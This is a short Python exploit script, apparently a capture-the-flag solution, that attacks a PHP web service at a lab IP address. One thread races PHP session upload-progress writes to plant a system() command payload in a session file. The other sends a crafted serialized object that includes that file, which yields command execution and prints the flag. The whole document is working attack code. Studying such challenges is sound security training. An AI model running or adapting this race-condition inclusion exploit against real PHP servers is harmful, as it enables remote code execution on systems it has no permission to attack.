#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/20 23:51
# blog: www.wlhhlc.top
import io
import requests
import threading
url = 'http://172.16.18.74:12396'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>dotast'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'fuck'}, data=data, files={'file': ('dota.txt', f)})
def read(session):
    while True:
        response = session.get(url+'?superman=superMan&pass=O%3A7%3A%22ECHO_FL%22%3A1%3A%7Bs%3A4%3A%22flag%22%3BO%3A2%3A%22LG%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A14%3A%22%2Ftmp%2Fsess_fuck%22%3Bs%3A5%3A%22file2%22%3BN%3B%7D%7D')
        if 'dotast' in response.text:
            print(response.text)
            break
        else:
            print('retry')

if __name__ == '__main__':
    session = requests.session()
    write = threading.Thread(target=write, args=(session,))
    write.daemon = True
    write.start()
    read(session)